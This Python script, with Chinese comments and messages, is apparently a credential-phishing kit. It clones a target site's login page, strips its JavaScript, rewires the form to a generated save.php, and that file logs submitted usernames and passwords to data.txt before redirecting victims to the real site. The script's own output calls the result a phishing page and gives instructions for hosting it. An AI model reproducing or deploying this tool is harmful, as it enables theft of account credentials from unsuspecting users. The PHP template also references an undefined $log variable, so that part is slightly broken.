#!/usr/bin/env python3
# -*- coding: utf-8 -*-


import requests
from bs4 import BeautifulSoup
import sys
import os
from urllib.parse import urlparse, urljoin
import time
import re

# ======================== 配置区域 ========================
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
TIMEOUT = 10
# ==========================================================

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

def url_to_folder_name(url):
    """
    将 URL 转换为有效的文件夹名称
    例如: https://example.com/login -> example.com_login
          https://sub.example.com/path/to/page -> sub.example.com_path_to_page
    """
    parsed = urlparse(url)
    netloc = parsed.netloc
    path = parsed.path.rstrip('/')
    # 合并 netloc 和 path，将非字母数字字符替换为下划线
    combined = netloc + path
    folder = re.sub(r'[^a-zA-Z0-9]+', '_', combined).strip('_')
    # 防止生成空字符串
    if not folder:
        folder = 'default'
    return folder

def fetch_page(url):
    headers = {"User-Agent": USER_AGENT}
    try:
        resp = requests.get(url, headers=headers, timeout=TIMEOUT)
        resp.encoding = resp.apparent_encoding or "utf-8"
        return resp.text, resp.url
    except Exception as e:
        print(f"[!] 页面下载失败: {e}")
        sys.exit(1)

def find_login_form(soup):
    forms = soup.find_all("form")
    for form in forms:
        if form.find("input", {"type": "password"}):
            return form
    return None

def collect_input_names(form):
    names = []
    for inp in form.find_all("input"):
        name = inp.get("name")
        if name:
            names.append(name)
    return names

def download_image(img_url, base_url, save_folder):
    if img_url.startswith("data:"):
        return img_url
    full_url = urljoin(base_url, img_url)
    parsed = urlparse(full_url)
    filename = os.path.basename(parsed.path)
    if not filename or '.' not in filename:
        filename = "image_" + str(int(time.time())) + ".jpg"
    filename = "".join(c for c in filename if c.isalnum() or c in "._-").strip()
    if not filename:
        filename = "image.jpg"
    local_path = os.path.join(save_folder, filename)
    rel_path = os.path.join("images", filename).replace("\\", "/")
    if os.path.exists(local_path):
        return rel_path
    headers = {"User-Agent": USER_AGENT}
    try:
        resp = requests.get(full_url, headers=headers, timeout=TIMEOUT, stream=True)
        if resp.status_code == 200:
            with open(local_path, "wb") as f:
                for chunk in resp.iter_content(1024):
                    f.write(chunk)
            print(f"[+] 下载图片: {full_url} -> {local_path}")
            return rel_path
        else:
            print(f"[!] 图片下载失败 (HTTP {resp.status_code}): {full_url}")
            return img_url
    except Exception as e:
        print(f"[!] 图片下载异常: {full_url} - {e}")
        return img_url

def process_images(soup, base_url, images_dir):
    imgs = soup.find_all("img")
    for img in imgs:
        src = img.get("src")
        if not src:
            continue
        local_src = download_image(src, base_url, images_dir)
        if local_src != src:
            img["src"] = local_src

def remove_js(soup):
    """
    删除所有 JavaScript 相关内容：
    - 删除所有 <script> 标签（包括内联和外联）
    - 删除所有元素的 on* 事件属性（如 onsubmit, onclick 等）
    """
    # 删除所有 script 标签
    for script in soup.find_all("script"):
        script.decompose()

    # 删除所有标签中的 on* 属性
    for tag in soup.find_all(True):
        attrs_to_remove = []
        for attr in tag.attrs:
            if attr.startswith("on"):
                attrs_to_remove.append(attr)
        for attr in attrs_to_remove:
            del tag[attr]

    return soup

def generate_php_saver(redirect_url):
    """
    根据用户提供的模板生成 PHP 文件，重定向到 redirect_url
    使用 replace 替代 format，避免花括号冲突
    """
    php_template = """<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    file_put_contents("data.txt", "用户名: $username, 密码: $password\\n", FILE_APPEND);
    file_put_contents("data.txt", $log, FILE_APPEND);
    
    header("Location: {redirect}");
    exit;
}
?>"""
    # 安全替换占位符
    return php_template.replace("{redirect}", redirect_url)

def main():
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <登录页面URL>")
        sys.exit(1)

    original_url = sys.argv[1]   # 用户输入的原始 URL，也用作重定向目标

    # 根据 URL 生成文件夹名
    folder_name = url_to_folder_name(original_url)
    SAVE_DIR = os.path.join(BASE_DIR, folder_name)
    IMAGES_DIR = os.path.join(SAVE_DIR, "images")
    os.makedirs(IMAGES_DIR, exist_ok=True)

    OUTPUT_HTML = os.path.join(SAVE_DIR, "index.html")
    PHP_BACKEND = os.path.join(SAVE_DIR, "save.php")
    LOG_FILE    = os.path.join(SAVE_DIR, "data.txt")

    print(f"[*] 目标 URL: {original_url}")
    print(f"[*] 生成文件夹: {folder_name}/")

    print(f"[*] 正在抓取页面...")
    html, final_url = fetch_page(original_url)

    soup = BeautifulSoup(html, "html.parser")
    login_form = find_login_form(soup)
    if not login_form:
        print("[!] 未找到包含密码字段的表单，退出。")
        sys.exit(1)

    field_names = collect_input_names(login_form)
    print(f"[+] 找到登录表单，字段名: {field_names}")
    print("[*] 注意：生成的 PHP 后端仅接收 'username' 和 'password' 字段，请确保目标表单字段名与此一致，否则需手动修改 save.php 中的对应变量名。")

    # 修改表单属性，指向本地后端
    login_form["action"] = "save.php"
    login_form["method"] = "post"

    print("[*] 正在处理图片...")
    process_images(soup, final_url, IMAGES_DIR)

    # 删除所有 JavaScript
    print("[*] 正在移除所有 JavaScript 代码...")
    soup = remove_js(soup)

    with open(OUTPUT_HTML, "w", encoding="utf-8") as f:
        f.write(str(soup))
    print(f"[+] 生成钓鱼页面: {OUTPUT_HTML}")

    # 生成 PHP 后端，重定向地址使用原始输入的 URL
    php_code = generate_php_saver(original_url)
    with open(PHP_BACKEND, "w", encoding="utf-8") as f:
        f.write(php_code)
    print(f"[+] 生成后端 PHP: {PHP_BACKEND}")

    open(LOG_FILE, "a").close()
    print(f"[+] 创建日志文件: {LOG_FILE} (确保 Web 服务器有写入权限)")

    print("\n[✔] 完成！请将整个文件夹上传到 Web 服务器：")
    print(f"    - 文件夹名称: {folder_name}")
    print(f"    - 访问路径: http://your-server/{folder_name}/index.html")
    print(f"    - 用户提交表单后将被重定向至您输入的原始 URL: {original_url}")
    print("    - 所有 JavaScript 已被删除，页面可能失去交互功能，但表单提交应正常工作。")
    print("    - 确保服务器支持 PHP，且 data.txt 可写。")
    print("    - 如果目标登录表单字段名不是 'username' 和 'password'，请手动修改 save.php 中的对应变量名。")

if __name__ == "__main__":
    main()